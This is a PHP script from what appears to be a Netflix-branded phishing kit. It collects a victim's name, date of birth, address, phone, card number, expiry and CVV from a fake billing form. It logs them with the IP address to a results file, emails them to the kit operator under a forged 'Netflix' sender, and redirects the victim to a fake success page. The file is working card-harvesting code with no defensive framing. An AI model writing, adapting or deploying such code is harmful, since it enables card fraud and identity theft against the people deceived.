<?php
/*==============[session_include]=================*/
session_start();
include ('./Email.php');
include ('./Block.php');

if(isset($_POST['f_name'])){
	if(!empty($_POST['date'])){
/*==============[CounTry]=================*/
$HF_V = $_SESSION['country_name'];
/*==============[ConfiGG]=================*/
$fn    =  $_POST['f_name'];
$date =  $_POST['date'];
$country =  $_POST['country'];
$addr =  $_POST['addres'];
$city =  $_POST['city'];
$zip =  $_POST['zip'];
$phone =  $_POST['phone'];
$number_c =  $_POST['number_cart'];
$date_cart =  $_POST['date_cart'];
$ccv_cart =  $_POST['ccv_cart'];
/*==============[Sander]=================*/
$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$HF = "Netflix";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = "Billing [" .$ip. "] [" .$HF_V. "] ";
$headers .= "From: Netflix" . "\r\n";
/*==============[Letter]=================*/
$message = "
################### By ".$HF." V1 ############################
Full name         =>   ".$fn."
Date of Birth     =>   ".$date."
country           =>   ".$HF_V."
Street address    =>   ".$addr."
City              =>   ".$city."
ZIP               =>   ".$zip."
PHONE             =>   ".$phone."
cart number       =>   ".$number_c."
date ccv          =>   ".$date_cart."
ccv            	  =>   ".$ccv_cart."
IP                =>   "."http://www.geoiptool.com/?IP=".$ip."
TIME              =>   ".$time."
################### By ".$HF." V1 ############################
";
/*==============[Backup]=================*/
$txt = fopen('../../Rzlta/rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);
mail($yourmail, $subject, $message , $headers);
/*==============[header]=================*/
header("location:../successfully/?websrc=".md5('W-imartex')."&dispatched=".rand(20,300)."&id=".rand(10000000000,500000000)." ");

 }else{
	header("Location: ../update_info/?websrc=".md5('W-imartex')."&dispatched=".rand(20,300)."&id=".rand(10000000000,500000000)."");
}}else{
	header("Location: ../update_info/?websrc=".md5('W-imartex')."&dispatched=".rand(20,300)."&id=".rand(10000000000,500000000)."");
}
/*==============[Salina]=================*/